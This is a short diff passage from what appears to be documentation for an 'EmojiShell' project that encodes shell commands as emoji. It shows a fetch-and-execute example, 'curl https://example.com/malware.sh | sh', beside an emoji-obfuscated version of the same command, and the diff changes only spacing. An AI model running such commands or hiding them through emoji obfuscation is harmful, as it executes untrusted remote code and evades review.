@@ -35,7 +35,7 @@ EmojiCode
 curl https://example.com/malware.sh | sh
 
 # EmojiShell 版本
-c$(🐚)1$(☕)2$(🌐) b$(📡)$(🔍)$(🚪)$(💻) | $(💻)
+c$(🐚)1$(☕)2$(🌐)  b$(📡)$(🔍)$(🚪)$(💻)  |  $(💻)
 - 可扩展性：
    - 兼容 
 "zsh"/
